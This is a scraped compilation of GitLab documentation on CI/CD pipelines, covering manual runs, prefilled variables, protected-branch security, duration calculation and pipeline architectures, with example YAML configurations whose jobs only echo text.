- `DEPLOY_CREDENTIALS` is listed in the **New pipeline** page, but with no value set.
The user is expected to define the value each time the pipeline is run manually.
- `DEPLOY_ENVIRONMENT` is pre-filled in the **New pipeline** page with `canary` as the default value,
and the message explains the other options.

Because of a [known issue](https://gitlab.com/gitlab-org/gitlab/-/issues/382857), projects that use [compliance pipelines](https://docs.gitlab.com/user/compliance/compliance_pipelines/) can have prefilled variables not appear
when running a pipeline manually. To workaround this issue,
[change the compliance pipeline configuration](https://docs.gitlab.com/user/compliance/compliance_pipelines/#prefilled-variables-are-not-shown).

#### Configure a list of selectable prefilled variable values [Permalink](https://docs.gitlab.com/ci/pipelines/\#configure-a-list-of-selectable-prefilled-variable-values "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/363660) in GitLab 15.5 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `run_pipeline_graphql`. Disabled by default.
- The `options` keyword was [introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/105502) in GitLab 15.7.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/106038) in GitLab 15.7. Feature flag `run_pipeline_graphql` removed.
- The variables list sometimes did not populate correctly due to [a bug](https://gitlab.com/gitlab-org/gitlab/-/issues/386245), which was resolved in GitLab 15.9.

You can define an array of CI/CD variable values the user can select from when running a pipeline manually.
These values are in a dropdown list in the **New pipeline** page. Add the list of
value options to `options` and set the default value with `value`. The string in `value`
must also be included in the `options` list.

For example:

YAML Copy to clipboard

```yaml
variables:
  DEPLOY_ENVIRONMENT:
    value: "staging"
    options:
      - "production"
      - "staging"
      - "canary"
    description: "The deployment target. Set to 'staging' by default."
```

### Run a pipeline by using a URL query string [Permalink](https://docs.gitlab.com/ci/pipelines/\#run-a-pipeline-by-using-a-url-query-string "Permalink")

You can use a query string to pre-populate the **New pipeline** page. For example, the query string
`.../pipelines/new?ref=my_branch&var[foo]=bar&file_var[file_foo]=file_bar` pre-populates the
**New pipeline** page with:

- **Run for** field: `my_branch`.
- **Variables** section:
  - Variable:
    - Key: `foo`
    - Value: `bar`
  - File:
    - Key: `file_foo`
    - Value: `file_bar`

The format of the `pipelines/new` URL is:

Copy to clipboard

```plaintext
.../pipelines/new?ref=<branch>&var[<variable_key>]=<value>&file_var[<file_key>]=<value>
```

The following parameters are supported:

- `ref`: specify the branch to populate the **Run for** field with.
- `var`: specify a `Variable` variable.
- `file_var`: specify a `File` variable.

For each `var` or `file_var`, a key and value are required.

### Add manual interaction to your pipeline [Permalink](https://docs.gitlab.com/ci/pipelines/\#add-manual-interaction-to-your-pipeline "Permalink")

[Manual jobs](https://docs.gitlab.com/ci/jobs/job_control/#create-a-job-that-must-be-run-manually),
allow you to require manual interaction before moving forward in the pipeline.

You can do this straight from the pipeline graph. Select **Run** (
play) to execute that particular job.

For example, your pipeline can start automatically, but require a manual action to
[deploy to production](https://docs.gitlab.com/ci/environments/deployments/#configure-manual-deployments).
In the following example, the `production` stage has a job with a manual action:

[![Pipeline graph that shows four stages: build, test, canary, and production. First three stages show completed jobs with green checkmarks, while production stage shows a pending deploy job.](https://docs.gitlab.com/ci/pipelines/img/manual_job_v17_9.png)](https://docs.gitlab.com/ci/pipelines/img/manual_job_v17_9.png)

#### Start all manual jobs in a stage [Permalink](https://docs.gitlab.com/ci/pipelines/\#start-all-manual-jobs-in-a-stage "Permalink")

If a stage contains only manual jobs, you can start all the jobs at the same time
by selecting **Run all manual** (
play) above the stage. If the stage contains
non-manual jobs, the option is not displayed.

### Skip a pipeline [Permalink](https://docs.gitlab.com/ci/pipelines/\#skip-a-pipeline "Permalink")

To push a commit without triggering a pipeline, add `[ci skip]` or `[skip ci]`, using any
capitalization, to your commit message.

Alternatively, with Git 2.10 or later, use the `ci.skip` [Git push option](https://docs.gitlab.com/topics/git/commit/#push-options-for-gitlab-cicd).
The `ci.skip` push option does not skip merge request pipelines.

### Delete a pipeline [Permalink](https://docs.gitlab.com/ci/pipelines/\#delete-a-pipeline "Permalink")

Users with the Owner role for a project can delete a pipeline:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Build > Pipelines**.
3. Select either the pipeline ID (for example `#123456789`) or the pipeline status icon
(for example **Passed**) of the pipeline to delete.
4. In the top right of the pipeline details page, select **Delete**.

Deleting a pipeline does not automatically delete its [child pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines).
See [issue 39503](https://gitlab.com/gitlab-org/gitlab/-/issues/39503) for more details.

Deleting a pipeline expires all pipeline caches, and deletes all immediately
related objects, such as jobs, logs, artifacts, and triggers.
**This action cannot be undone**.

### Pipeline security on protected branches [Permalink](https://docs.gitlab.com/ci/pipelines/\#pipeline-security-on-protected-branches "Permalink")

A strict security model is enforced when pipelines are executed on
[protected branches](https://docs.gitlab.com/user/project/repository/branches/protected/).

The following actions are allowed on protected branches if the user is
[allowed to merge or push](https://docs.gitlab.com/user/project/repository/branches/protected/)
to that specific branch:

- Run manual pipelines (using the [Web UI](https://docs.gitlab.com/ci/pipelines/#run-a-pipeline-manually) or [pipelines API](https://docs.gitlab.com/ci/pipelines/#pipelines-api)).
- Run scheduled pipelines.
- Run pipelines using triggers.
- Run on-demand DAST scan.
- Trigger manual actions on existing pipelines.
- Retry or cancel existing jobs (using the Web UI or pipelines API).

**Variables** marked as **protected** are accessible to jobs that run in pipelines for protected branches. Only assign users the right to merge to protected branches if they have permission to access sensitive information like deployment credentials and tokens.

**Runners** marked as **protected** can run jobs only on protected
branches, preventing untrusted code from executing on the protected runner and
preserving deployment keys and other credentials from being unintentionally
accessed. To ensure that jobs intended to be executed on protected
runners do not use regular runners, they must be [tagged](https://docs.gitlab.com/ci/yaml/#tags) accordingly.

Review the [deployment safety](https://docs.gitlab.com/ci/environments/deployment_safety/)
page for additional security recommendations for securing your pipelines.

## Trigger a pipeline when an upstream project is rebuilt (deprecated) [Permalink](https://docs.gitlab.com/ci/pipelines/\#trigger-a-pipeline-when-an-upstream-project-is-rebuilt-deprecated "Permalink")

- Tier: Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

This feature was [deprecated](https://gitlab.com/gitlab-org/gitlab/-/issues/501460) in GitLab 17.6
and is planned for removal in 19.0. Use [CI/CD jobs with pipeline trigger tokens](https://docs.gitlab.com/ci/triggers/#use-a-cicd-job) instead.
This is a breaking change.

You can set up your project to automatically trigger a pipeline based on tags in a different project.
When a new tag pipeline in the subscribed project finishes, it triggers a pipeline on your project’s default branch,
regardless of the tag pipeline’s success, failure, or cancellation.

Prerequisites:

- The upstream project must be [public](https://docs.gitlab.com/user/public_access/).
- The user must have the Developer role
in the upstream project.

To trigger the pipeline when the upstream project is rebuilt:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Settings > CI/CD**.
3. Expand **Pipeline subscriptions**.
4. Select **Add project**.
5. Enter the project you want to subscribe to, in the format `<namespace>/<project>`.
For example, if the project is `https://gitlab.com/gitlab-org/gitlab`, use `gitlab-org/gitlab`.
6. Select **Subscribe**.

The maximum number of upstream pipeline subscriptions is 2 by default, for both the upstream and
downstream projects. On GitLab Self-Managed, an administrator can change this
[limit](https://docs.gitlab.com/administration/instance_limits/#number-of-cicd-subscriptions-to-a-project).

## How pipeline duration is calculated [Permalink](https://docs.gitlab.com/ci/pipelines/\#how-pipeline-duration-is-calculated "Permalink")

The total running time for a given pipeline excludes:

- The duration of the initial run for any job that is retried or manually re-run.
- Any pending (queue) time.

That means that if a job is retried or manually re-run, only the duration of the latest run is included in the total running time.

Each job is represented as a `Period`, which consists of:

- `Period#first` (when the job started).
- `Period#last` (when the job finished).

A simple example is:

- A (0, 2)
- A’ (2, 4)
  - This is retrying A
- B (1, 3)
- C (6, 7)

In the example:

- A begins at 0 and ends at 2.
- A’ begins at 2 and ends at 4.
- B begins at 1 and ends at 3.
- C begins at 6 and ends at 7.

Visually, it can be viewed as:

Copy to clipboard

```plaintext
0  1  2  3  4  5  6  7
AAAAAAA
   BBBBBBB
      A'A'A'A
                  CCCC
```

Because A is retried, we ignore it and count only job A’.
The union of B, A’, and C is (1, 4) and (6, 7). Therefore, the total
running time is:

Copy to clipboard

```plaintext
(4 - 1) + (7 - 6) => 4
```

## View pipelines [Permalink](https://docs.gitlab.com/ci/pipelines/\#view-pipelines "Permalink")

To view all the pipelines that ran for your project:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Build > Pipelines**.

You can filter the **Pipelines** page by:

- Trigger author
- Branch name
- Status
- Tag
- Source

Select **Pipeline ID** in the dropdown list in the top right to display the pipeline IDs
(unique ID across the instance).
Select **pipeline IID** to display the pipeline IIDs (internal ID, unique across the project only).

For example:

[![A list of pipelines displayed on the Pipelines page, with filters for trigger author, branch name, status, tag, and source.](https://docs.gitlab.com/ci/pipelines/img/pipeline_list_v16_11.png)](https://docs.gitlab.com/ci/pipelines/img/pipeline_list_v16_11.png)

To view the pipelines that relate to a specific merge request, go to the **Pipelines** tab
in the merge request.

### Pipeline details [Permalink](https://docs.gitlab.com/ci/pipelines/\#pipeline-details "Permalink")

History

- Pipeline detail view [updated](https://gitlab.com/gitlab-org/gitlab/-/issues/424403) in GitLab 16.6 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `new_pipeline_graph`. Disabled by default.
- Updated pipeline detail view [enabled on GitLab.com](https://gitlab.com/gitlab-org/gitlab/-/issues/426902) in GitLab 16.8.

Select a pipeline to open the pipeline details page which shows every job in the pipeline.
From this page you can cancel a running pipeline, retry failed jobs, or [delete a pipeline](https://docs.gitlab.com/ci/pipelines/#delete-a-pipeline).

The pipeline details page displays a graph of all the jobs in the pipeline:

[![Pipeline detail page](https://docs.gitlab.com/ci/pipelines/img/pipeline_details_v17_9.png)](https://docs.gitlab.com/ci/pipelines/img/pipeline_details_v17_9.png)

You can use a standard URL to access the details for specific pipelines:

- `gitlab.example.com/my-group/my-project/-/pipelines/latest`: The details page
for the latest pipeline for the most recent commit on the default branch in the project.
- `gitlab.example.com/my-group/my-project/-/pipelines/<branch>/latest`: The details page
for the latest pipeline for the most recent commit on branch `<branch>` in the project.

#### Group jobs by stage or `needs` configuration [Permalink](https://docs.gitlab.com/ci/pipelines/\#group-jobs-by-stage-or-needs-configuration "Permalink")

When you configure jobs with the [`needs`](https://docs.gitlab.com/ci/yaml/#needs) keyword, you have
two options for how to group the jobs in the pipeline details page. To group the jobs
by stage configuration, select **stage** in the **Group jobs by** section:

[![jobs grouped by stage](https://docs.gitlab.com/ci/pipelines/img/pipeline_stage_view_v17_9.png)](https://docs.gitlab.com/ci/pipelines/img/pipeline_stage_view_v17_9.png)

To group the jobs by [`needs`](https://docs.gitlab.com/ci/yaml/#needs) configuration, select **Job dependencies**.
You can optionally select **Show dependencies** to render lines between dependent jobs.

[![jobs grouped by job dependencies](https://docs.gitlab.com/ci/pipelines/img/pipeline_dependency_view_v17_9.png)](https://docs.gitlab.com/ci/pipelines/img/pipeline_dependency_view_v17_9.png)

Jobs in the leftmost column run first, and jobs that depend on them are grouped in the next columns.
In this example:

- `lint-job` is configured with `needs: []` and depends on no jobs, so it displays in the first column,
despite being in the `test` stage.
- `test-job1` depends on `build-job1`, and `test-job2` depends on both `build-job1` and `build-job2`,
so both test jobs display in the second column.
- Both `deploy` jobs depend on jobs in second column (which themselves depend on other earlier jobs),
so the deploy jobs display in the third column.

When you hover over a job in the **Job dependencies** view, every job that must run
before the selected job is highlighted:

[![pipeline dependency view on hover](https://docs.gitlab.com/ci/pipelines/img/pipeline_dependency_view_on_hover_v17_9.png)](https://docs.gitlab.com/ci/pipelines/img/pipeline_dependency_view_on_hover_v17_9.png)

### Pipeline mini graphs [Permalink](https://docs.gitlab.com/ci/pipelines/\#pipeline-mini-graphs "Permalink")

Pipeline mini graphs take less space and can tell you at a quick glance if all jobs passed
or something failed. They show all related jobs for a single commit and the net result
of each stage of your pipeline. You can quickly see what failed and fix it.

The pipeline mini graph always group jobs by stage, and display throughout GitLab
when displaying pipeline or commit details.

[![Pipeline mini graph](https://docs.gitlab.com/ci/pipelines/img/pipeline_mini_graph_v16_11.png)](https://docs.gitlab.com/ci/pipelines/img/pipeline_mini_graph_v16_11.png)

Stages in pipeline mini graphs are expandable. Hover your mouse over each stage
to see the name and status, and select a stage to expand its jobs list.

### Downstream pipeline graphs [Permalink](https://docs.gitlab.com/ci/pipelines/\#downstream-pipeline-graphs "Permalink")

When a pipeline contains a job that triggers a [downstream pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/),
you can see the downstream pipeline in the pipeline details view and mini graphs.

In the pipeline details view, a card displays for every triggered downstream pipeline
on the right of the pipeline graph. Hover over a card to see which job triggered the
downstream pipeline. Select a card to display the downstream pipeline to the right
of the pipeline graph.

In the pipeline mini graph, the status of every triggered downstream pipeline displays
as additional status icons to the right of the mini graph. Select a downstream pipeline
status icon to go to the detail page of that downstream pipeline.

## Pipeline success and duration charts [Permalink](https://docs.gitlab.com/ci/pipelines/\#pipeline-success-and-duration-charts "Permalink")

Pipeline analytics are available on the [**CI/CD Analytics** page](https://docs.gitlab.com/user/analytics/ci_cd_analytics/).

## Pipeline badges [Permalink](https://docs.gitlab.com/ci/pipelines/\#pipeline-badges "Permalink")

Pipeline status and test coverage report badges are available and configurable for each project.
For information on adding pipeline badges to projects, see [Pipeline badges](https://docs.gitlab.com/ci/pipelines/settings/#pipeline-badges).

## Pipelines API [Permalink](https://docs.gitlab.com/ci/pipelines/\#pipelines-api "Permalink")

GitLab provides API endpoints to:

- Perform basic functions. For more information, see [Pipelines API](https://docs.gitlab.com/api/pipelines/).
- Maintain pipeline schedules. For more information, see [Pipeline schedules API](https://docs.gitlab.com/api/pipeline_schedules/).
- Trigger pipeline runs. For more information, see:
  - [Triggering pipelines through the API](https://docs.gitlab.com/ci/triggers/).
  - [Pipeline triggers API](https://docs.gitlab.com/api/pipeline_triggers/).

## Ref specs for runners [Permalink](https://docs.gitlab.com/ci/pipelines/\#ref-specs-for-runners "Permalink")

When a runner picks a pipeline job, GitLab provides that job’s metadata. This includes the [Git refspecs](https://git-scm.com/book/en/v2/Git-Internals-The-Refspec),
which indicate which ref (such as branch or tag) and commit (SHA1) are checked out from your
project repository.

This table lists the refspecs injected for each pipeline type:

| Pipeline type | Refspecs |
| --- | --- |
| pipeline for branches | `+<sha>:refs/pipelines/<id>` and `+refs/heads/<name>:refs/remotes/origin/<name>` |
| pipeline for tags | `+<sha>:refs/pipelines/<id>` and `+refs/tags/<name>:refs/tags/<name>` |
| [merge request pipeline](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/) | `+refs/pipelines/<id>:refs/pipelines/<id>` |

|
|

The refs `refs/heads/<name>` and `refs/tags/<name>` exist in your
project repository. GitLab generates the special ref `refs/pipelines/<id>` during a
running pipeline job. This ref can be created even after the associated branch or tag has been
deleted. It’s therefore useful in some features such as [automatically stopping an environment](https://docs.gitlab.com/ci/environments/#stopping-an-environment),
and [merge trains](https://docs.gitlab.com/ci/pipelines/merge_trains/) that might run pipelines after branch deletion.

## Troubleshooting [Permalink](https://docs.gitlab.com/ci/pipelines/\#troubleshooting "Permalink")

### Pipeline subscriptions continue after user deletion [Permalink](https://docs.gitlab.com/ci/pipelines/\#pipeline-subscriptions-continue-after-user-deletion "Permalink")

When a user [deletes their GitLab.com account](https://docs.gitlab.com/user/profile/account/delete_account/#delete-your-own-account),
the deletion does not occur for seven days. During this period, any [pipeline subscriptions created by that user](https://docs.gitlab.com/ci/pipelines/#trigger-a-pipeline-when-an-upstream-project-is-rebuilt-deprecated)
continue to run with the user’s original permissions. To prevent unauthorized pipeline executions,
immediately update pipeline subscription settings for the deleted user.

## Help & feedback

[Edit this page](https://gitlab.com/gitlab-org/gitlab/-/blob/master/doc/ci/pipelines/_index.md)

[Suggest updates](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Documentation)

[Request support](https://about.gitlab.com/support/)

[View pricing](https://about.gitlab.com/pricing/)

[Try GitLab for free](https://about.gitlab.com/free-trial/)

[Post on the GitLab forum](https://forum.gitlab.com/new-topic?title=topic%20title&body=topic%20body&tags=docs-feedback)

![Company Logo](https://cdn.cookielaw.org/logos/aa14a5c8-79e3-442a-8177-464ad850b19d/e46c1d0d-1f66-481f-bc06-5427671431da/253e6fee-c4c0-4b60-bc35-79cdae5dda32/gitlab-logo-100.png)

## Privacy Preference Center

## Privacy Preference Center

- ### Your Privacy

- ### Strictly Necessary Cookies

- ### Functionality Cookies

- ### Performance and Analytics Cookies

- ### Targeting and Advertising Cookies

- ### Ad User Data

- ### Ad Personalization


#### Your Privacy

When you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies. This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience. Because we respect your right to privacy, you can choose not to allow some types of cookies. Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.


[Cookie Policy](https://about.gitlab.com/privacy/cookies/)

User ID:  64584c03-3e47-434d-a330-761410b8a8c1

This User ID will be used as a unique identifier while storing and accessing your preferences for future.

Timestamp:  --

#### Strictly Necessary Cookies

Always Active

These cookies are necessary for the website to function and cannot be switched off in our systems. They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, enabling you to securely log into the site, filling in forms, or using the customer checkout. GitLab processes any personal data collected through these cookies on the basis of our legitimate interest.

Cookies Details‎

#### Functionality Cookies

Functionality Cookies

These cookies enable helpful but non-essential website functions that improve your website experience. By recognizing you when you return to our website, they may, for example, allow us to personalize our content for you or remember your preferences. If you do not allow these cookies then some or all of these services may not function properly. GitLab processes any personal data collected through these cookies on the basis of your consent

Cookies Details‎

#### Performance and Analytics Cookies

Performance and Analytics Cookies

These cookies allow us and our third-party service providers to recognize and count the number of visitors on our websites and to see how visitors move around our websites when they are using it. This helps us improve our products and ensures that users can easily find what they need on our websites. These cookies usually generate aggregate statistics that are not associated with an individual. To the extent any personal data is collected through these cookies, GitLab processes that data on the basis of your consent.

Cookies Details‎

#### Targeting and Advertising Cookies

Targeting and Advertising Cookies

These cookies enable different advertising related functions. They may allow us to record information about your visit to our websites, such as pages visited, links followed, and videos viewed so we can make our websites and the advertising displayed on it more relevant to your interests. They may be set through our website by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant advertisements on other websites. GitLab processes any personal data collected through these cookies on the basis of your consent.

Cookies Details‎

#### Ad User Data

Ad User Data

Sets consent for sending user data to Google for advertising purposes.

Cookies Details‎

#### Ad Personalization

Ad Personalization

Sets consent for personalized advertising.

Cookies Details‎

Back Button

### Cookie List

Filter Button

ConsentLeg.Interest

checkbox labellabel

checkbox labellabel

checkbox labellabel

Clear

checkbox labellabel

ApplyCancel

Confirm My Choices

Allow All

[![Powered by Onetrust](https://cdn.cookielaw.org/logos/static/powered_by_logo.svg)](https://www.onetrust.com/products/cookie-consent/)

---


## 4. Pipeline architecture {#section-4}

*Source: [https://docs.gitlab.com/ee/ci/pipelines/pipeline_architectures.html](https://docs.gitlab.com/ee/ci/pipelines/pipeline_architectures.html)*

# Pipeline architecture

- Tier: Free, Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

Pipelines are the fundamental building blocks for CI/CD in GitLab. This page documents
some of the important concepts related to them.

You can structure your pipelines with different methods, each with their
own advantages. These methods can be mixed and matched if needed:

- [Basic](https://docs.gitlab.com/ci/pipelines/pipeline_architectures/#basic-pipelines): Good for straightforward projects where all the configuration is in one place.

- [Pipelines with the `needs` keyword](https://docs.gitlab.com/ci/pipelines/pipeline_architectures/#pipelines-with-the-needs-keyword): Good for large, complex projects that need efficient execution.

- [Parent-child pipelines](https://docs.gitlab.com/ci/pipelines/pipeline_architectures/#parent-child-pipelines): Good for monorepos and projects with lots of independently defined components.


For an overview, see the [Parent-Child Pipelines feature demo](https://youtu.be/n8KpBSqZNbk).

- [Multi-project pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#multi-project-pipelines): Good for larger products that require cross-project interdependencies,
like those with a [microservices architecture](https://about.gitlab.com/blog/2016/08/16/trends-in-version-control-land-microservices/).

For example, you might deploy your web application from three different GitLab projects.
With multi-project pipelines you can trigger a pipeline in each project, where each
has its own build, test, and deploy process. You can visualize the connected pipelines
in one place, including all cross-project interdependencies.


For an overview, see the [Multi-project pipelines demo](https://www.youtube.com/watch?v=g_PIwBM1J84).


## Basic pipelines [Permalink](https://docs.gitlab.com/ci/pipelines/pipeline_architectures/\#basic-pipelines "Permalink")

Basic pipelines are the simplest pipelines in GitLab. It runs everything in the build stage concurrently,
and once all of those finish, it runs everything in the test and subsequent stages the same way.
It’s not the most efficient, and if you have lots of steps it can grow quite complex, but it’s
easier to maintain:

```
Basic pipelinesShows a pipeline that runs sequentially through the build, test, and deploy stages.
build stage
test stage
deploy stage

build_a
build
build_b
test_a
test
test_b
deploy_a
deploy
deploy_b
```

Example basic `/.gitlab-ci.yml` pipeline configuration matching the diagram:

YAML Copy to clipboard

```yaml
stages:
  - build
  - test
  - deploy

default:
  image: alpine

build_a:
  stage: build
  script:
    - echo "This job builds something."

build_b:
  stage: build
  script:
    - echo "This job builds something else."

test_a:
  stage: test
  script:
    - echo "This job tests something. It will only run when all jobs in the"
    - echo "build stage are complete."

test_b:
  stage: test
  script:
    - echo "This job tests something else. It will only run when all jobs in the"
    - echo "build stage are complete too. It will start at about the same time as test_a."

deploy_a:
  stage: deploy
  script:
    - echo "This job deploys something. It will only run when all jobs in the"
    - echo "test stage complete."
  environment: production

deploy_b:
  stage: deploy
  script:
    - echo "This job deploys something else. It will only run when all jobs in the"
    - echo "test stage complete. It will start at about the same time as deploy_a."
  environment: production
```

## Pipelines with the `needs` keyword [Permalink](https://docs.gitlab.com/ci/pipelines/pipeline_architectures/\#pipelines-with-the-needs-keyword "Permalink")

If efficiency is important and you want everything to run as quickly as possible,
you can use the [`needs` keyword](https://docs.gitlab.com/ci/yaml/needs/) to define dependencies
between your jobs. When GitLab knows the dependencies between your jobs,
jobs can run as fast as possible, even starting earlier than other jobs in the same stage.

In the following example, if `build_a` and `test_a` are much faster than `build_b` and
`test_b`, GitLab starts `deploy_a` even if `build_b` is still running.

```
Pipeline using needsShows how two jobs can start without waiting for earlier stages to complete
Pipeline using needs

deploy_a
build_a
test_a
build_b
test_b
deploy_b
```

Example `/.gitlab-ci.yml` configuration matching the diagram:

YAML Copy to clipboard

```yaml
stages:
  - build
  - test
  - deploy

default:
  image: alpine

build_a:
  stage: build
  script:
    - echo "This job builds something quickly."

build_b:
  stage: build
  script:
    - echo "This job builds something else slowly."

test_a:
  stage: test
  needs: [build_a]
  script:
    - echo "This test job will start as soon as build_a finishes."
    - echo "It will not wait for build_b, or other jobs in the build stage, to finish."

test_b:
  stage: test
  needs: [build_b]
  script:
    - echo "This test job will start as soon as build_b finishes."
    - echo "It will not wait for other jobs in the build stage to finish."

deploy_a:
  stage: deploy
  needs: [test_a]
  script:
    - echo "Since build_a and test_a run quickly, this deploy job can run much earlier."
    - echo "It does not need to wait for build_b or test_b."
  environment: production

deploy_b:
  stage: deploy
  needs: [test_b]
  script:
    - echo "Since build_b and test_b run slowly, this deploy job will run much later."
  environment: production
```

## Parent-child pipelines [Permalink](https://docs.gitlab.com/ci/pipelines/pipeline_architectures/\#parent-child-pipelines "Permalink")

As pipelines grow more complex, a few related problems start to emerge:

- The staged structure, where all steps in a stage must complete before the first
job in next stage begins, causes waits that slow things down.
- Configuration for the single global pipeline becomes
hard to manage.
- Imports with [`include`](https://docs.gitlab.com/ci/yaml/#include) increase the complexity of the configuration, and can cause
namespace collisions where jobs are unintentionally duplicated.
- Pipeline UX has too many jobs and stages to work with.

Additionally, sometimes the behavior of a pipeline needs to be more dynamic. The ability
to choose to start sub-pipelines (or not) is a powerful ability, especially if the
YAML is dynamically generated.

In the previous [basic pipeline](https://docs.gitlab.com/ci/pipelines/pipeline_architectures/#basic-pipelines) and [`needs` pipeline](https://docs.gitlab.com/ci/pipelines/pipeline_architectures/#pipelines-with-the-needs-keyword)
examples, there are two packages that could be built independently.
These cases are ideal for using [parent-child pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines).
It separates out the configuration into multiple files, keeping things simpler.
You can combine parent-child pipelines with:

- The [`rules` keyword](https://docs.gitlab.com/ci/yaml/#rules): For example, have the child pipelines triggered only
when there are changes to that area.
- The [`include` keyword](https://docs.gitlab.com/ci/yaml/#include): Bring in common behaviors, ensuring
you are not repeating yourself.
- The [`needs` keyword](https://docs.gitlab.com/ci/pipelines/pipeline_architectures/#pipelines-with-the-needs-keyword) inside of child pipelines, achieving the benefits of both.

```
Parent and child pipelinesShows that a parent pipeline can trigger independent child pipelines
Parent pipeline
child pipeline B
child pipeline A

trigger_a
build_a
trigger_b
build_b
test_b
deploy_b
test_a
deploy_a
```

Example `/.gitlab-ci.yml` configuration for the parent pipeline matching the diagram:

YAML Copy to clipboard

```yaml
stages:
  - triggers

trigger_a:
  stage: triggers
  trigger:
    include: a/.gitlab-ci.yml
  rules:
    - changes:
        - a/*

trigger_b:
  stage: triggers
  trigger:
    include: b/.gitlab-ci.yml
  rules:
    - changes:
        - b/*
```

Example child `a` pipeline configuration, located in `/a/.gitlab-ci.yml`, making
use of the `needs` keyword:

YAML Copy to clipboard

```yaml
stages:
  - build
  - test
  - deploy

default:
  image: alpine

build_a:
  stage: build
  script:
    - echo "This job builds something."

test_a:
  stage: test
  needs: [build_a]
  script:
    - echo "This job tests something."

deploy_a:
  stage: deploy
  needs: [test_a]
  script:
    - echo "This job deploys something."
  environment: production
```

Example child `b` pipeline configuration, located in `/b/.gitlab-ci.yml`, making
use of the `needs` keyword:

YAML Copy to clipboard

```yaml
stages:
  - build
  - test
  - deploy

default:
  image: alpine

build_b:
  stage: build
  script:
    - echo "This job builds something else."

test_b:
  stage: test
  needs: [build_b]
  script:
    - echo "This job tests something else."

deploy_b:
  stage: deploy
  needs: [test_b]
  script:
    - echo "This job deploys something else."
  environment: production
```

Jobs can be set to run before or after triggering child pipelines in GitLab, allowing common setup steps or unified deployment.

## Help & feedback

[Edit this page](https://gitlab.com/gitlab-org/gitlab/-/blob/master/doc/ci/pipelines/pipeline_architectures.md)

[Suggest updates](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Documentation)

[Request support](https://about.gitlab.com/support/)

[View pricing](https://about.gitlab.com/pricing/)

[Try GitLab for free](https://about.gitlab.com/free-trial/)

[Post on the GitLab forum](https://forum.gitlab.com/new-topic?title=topic%20title&body=topic%20body&tags=docs-feedback)

![Company Logo](https://cdn.cookielaw.org/logos/aa14a5c8-79e3-442a-8177-464ad850b19d/e46c1d0d-1f66-481f-bc06-5427671431da/253e6fee-c4c0-4b60-bc35-79cdae5dda32/gitlab-logo-100.png)

## Privacy Preference Center

## Privacy Preference Center

- ### Your Privacy

- ### Strictly Necessary Cookies

- ### Functionality Cookies

- ### Performance and Analytics Cookies

- ### Targeting and Advertising Cookies

- ### Ad User Data

- ### Ad Personalization


#### Your Privacy

When you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies. This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience. Because we respect your right to privacy, you can choose not to allow some types of cookies. Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.


[Cookie Policy](https://about.gitlab.com/privacy/cookies/)

User ID:  21947265-c5c6-4f6d-bf6a-c354b26b2683

This User ID will be used as a unique identifier while storing and accessing your preferences for future.

Timestamp:  --

#### Strictly Necessary Cookies

Always Active

These cookies are necessary for the website to function and cannot be switched off in our systems. They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, enabling you to securely log into the site, filling in forms, or using the customer checkout. GitLab processes any personal data collected through these cookies on the basis of our legitimate interest.

Cookies Details‎

#### Functionality Cookies

Functionality Cookies

These cookies enable helpful but non-essential website functions that improve your website experience. By recognizing you when you return to our website, they may, for example, allow us to personalize our content for you or remember your preferences. If you do not allow these cookies then some or all of these services may not function properly. GitLab processes any personal data collected through these cookies on the basis of your consent

Cookies Details‎

#### Performance and Analytics Cookies

Performance and Analytics Cookies

These cookies allow us and our third-party service providers to recognize and count the number of visitors on our websites and to see how visitors move around our websites when they are using it. This helps us improve our products and ensures that users can easily find what they need on our websites. These cookies usually generate aggregate statistics that are not associated with an individual. To the extent any personal data is collected through these cookies, GitLab processes that data on the basis of your consent.

Cookies Details‎

#### Targeting and Advertising Cookies

Targeting and Advertising Cookies

These cookies enable different advertising related functions. They may allow us to record information about your visit to our websites, such as pages visited, links followed, and videos viewed so we can make our websites and the advertising displayed on it more relevant to your interests. They may be set through our website by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant advertisements on other websites. GitLab processes any personal data collected through these cookies on the basis of your consent.

Cookies Details‎

#### Ad User Data

Ad User Data

Sets consent for sending user data to Google for advertising purposes.

Cookies Details‎

#### Ad Personalization

Ad Personalization

Sets consent for personalized advertising.

Cookies Details‎

Back Button

### Cookie List

Filter Button

ConsentLeg.Interest

checkbox labellabel

checkbox labellabel

checkbox labellabel

Clear

checkbox labellabel

ApplyCancel

Confirm My Choices

Allow All

[![Powered by Onetrust](https://cdn.cookielaw.org/logos/static/powered_by_logo.svg)](https://www.onetrust.com/products/cookie-consent/)

---


## 5. CI/CD Jobs {#section-5}

*Source: [https://docs.gitlab.com/ee/ci/jobs/](https://docs.gitlab.com/ee/ci/jobs/)*

# CI/CD Jobs

- Tier: Free, Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

